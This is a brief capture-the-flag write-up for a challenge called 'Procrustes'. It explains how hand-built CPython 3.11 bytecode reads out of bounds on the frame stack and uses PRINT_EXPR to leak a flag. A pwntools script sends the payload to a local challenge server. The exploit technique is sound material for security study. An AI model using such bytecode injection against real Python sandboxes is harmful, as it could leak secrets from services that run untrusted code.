# Procrustes

## TL;DR
Find a valid CPython 3.11 bytecode that reads out of bounds to print the flag, but is also a valid AST string literal without forbidden characters. We used `PRINT_EXPR` to print the flag left on the dirty frame stack.

## Solution Script

```python
from pwn import *

OPMAP = {
    "SETUP_ANNOTATIONS": 85,
    "LOAD_FAST": 124,
    "PRINT_EXPR": 70,
    "RETURN_VALUE": 83,
}


def assemble(ops):
    ret = b""
    for op, arg in ops:
        ret += bytes([OPMAP[op], arg])
    return ret


bc = assemble([
    ("SETUP_ANNOTATIONS", ord('"')),
    ("LOAD_FAST", 20),
    ("PRINT_EXPR", ord("!")),
    ("LOAD_FAST", 20),
    ("RETURN_VALUE", ord('"')),
])

r = remote("localhost", 7000)
r.sendlineafter(b"> ", bc)
print(r.recvall().decode())

r.close()
```
